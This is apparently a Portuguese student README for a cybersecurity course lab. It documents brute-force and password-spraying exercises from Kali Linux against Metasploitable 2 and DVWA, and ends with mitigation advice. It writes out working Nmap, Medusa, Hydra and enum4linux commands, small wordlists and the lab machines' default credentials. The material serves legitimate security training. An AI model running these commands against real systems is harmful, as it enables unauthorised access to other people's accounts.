📌 README.md – Projeto: Ataques de Força Bruta com Medusa, Kali Linux e Metasploitable 2
🔐 Ataques de Força Bruta com Medusa, Kali Linux e Ambientes Vulneráveis (Metasploitable 2 e DVWA)

Este projeto foi desenvolvido como parte do desafio da DIO no curso de Cibersegurança.
O objetivo foi simular cenários de ataque de força bruta em um ambiente controlado, utilizando as ferramentas Kali Linux, Medusa e outras soluções de auditoria de segurança.

🎯 Objetivo do Projeto
Demonstrar entendimento sobre ataques de força bruta em diferentes serviços.
Utilizar o Kali Linux como ambiente atacante e o Metasploitable 2 como ambiente vulnerável.
Empregar Medusa, Hydra e Enum4linux em auditoria de segurança.
Documentar o processo de configuração, execução e análise de resultados.
Propor medidas de mitigação que preveniriam ataques reais.

🖥️ Arquitetura do Ambiente
O ambiente foi configurado com duas máquinas virtuais no VirtualBox:

📌 Kali Linux (Atacante)
Rede: Host-Only
Ferramentas instaladas nativamente

📌 Metasploitable 2 (Alvo)
Rede: Host-Only
Serviços vulneráveis explorados:
FTP (vsftpd)
DVWA (aplicação web vulnerável)
SMB
Ambas as VMs foram testadas com ping para validar a comunicação.

🛠️ Ferramentas Utilizadas
Medusa → brute force em FTP e SMB
Hydra → brute force em formulários web
Nmap → scan e enumeração de serviços
Enum4linux → enumeração de usuários SMB
DVWA → aplicação vulnerável com níveis ajustáveis
Wordlists personalizadas

🔥 Cenário 1 – Brute Force no FTP com Medusa
1. Enumeração com Nmap
nmap -sV <IP-do-Metasploitable>

Serviço encontrado:

21/tcp  open  ftp  vsftpd 2.3.4

2. Wordlist criada manualmente
echo "123456" > wordlist.txt
echo "msfadmin" >> wordlist.txt
echo "password" >> wordlist.txt

3. Ataque brute force
medusa -h <IP-do-Metasploitable> -u msfadmin -P wordlist.txt -M ftp

Resultado esperado: descobrir que a senha padrão é msfadmin.


🌐 Cenário 2 – Brute Force Web (DVWA)
1. Acesso ao DVWA
http://<IP-do-Metasploitable>/dvwa

Credenciais padrão:

Usuário: admin
Senha: password

O nível de segurança foi configurado em Low para permitir o brute force.

2. Wordlist
echo "password" > passwords.txt
echo "admin" >> passwords.txt
echo "123456" >> passwords.txt

3. Ataque com Hydra
hydra -l admin -P passwords.txt <IP> http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"


Resultado esperado:
Hydra deve detectar a senha correta do usuário admin.

🗂️ Cenário 3 – Password Spraying no SMB
1. Enumeração de usuários com Enum4linux
enum4linux -U <IP>

Usuários comuns no Metasploitable 2:
msfadmin
user
root
service

2. Lista de usuários
echo "msfadmin" > users.txt
echo "user" >> users.txt
echo "root" >> users.txt

3. Password Spraying com Medusa
medusa -h <IP> -U users.txt -p 123456 -M smbnt

Se o serviço permitir, a ferramenta identifica contas com senha fraca.

🛡️ Mitigações e Boas Práticas
🔹 Segurança de Senhas
Implementação de MFA (autenticação multifator);
Políticas rígidas de complexidade;
Troca periódica de senha;
Bloqueio automático após várias tentativas falhas.


🔹 Proteção de Serviços
Desabilitar FTP antigo e SMBv1;
Substituir por SFTP e SMBv3;
Restringir portas usando firewall (21, 80, 139, 445).


🔹 Proteção Web (DVWA / Sistemas reais)
Utilizar CAPTCHA;
Implementar rate-limit;
Filtrar requisições de força bruta;
Monitorar logs de acesso.


🔹 Monitoramento
Ferramentas como Fail2ban;
Sistema de logs centralizados;
Alertas de segurança em tentativas de login suspeitas.


📁 Estrutura do Repositório
/
├── README.md
├── wordlists/
│   ├── wordlist.txt
│   └── passwords.txt
├── scripts/
│   ├── ftp_medusa.sh
│   ├── dvwa_hydra.sh
│   └── smb_spraying.sh
└── outputs/
    ├── nmap_result.txt
    └── medusa_ftp_output.txt


📚 Referências
Kali Linux – https://www.kali.org
DVWA – https://github.com/digininja/DVWA
Medusa – https://www.foofus.net

Nmap Documentation – https://nmap.org/book/man.html

Enum4linux – https://github.com/CiscoCXSecurity/enum4linux
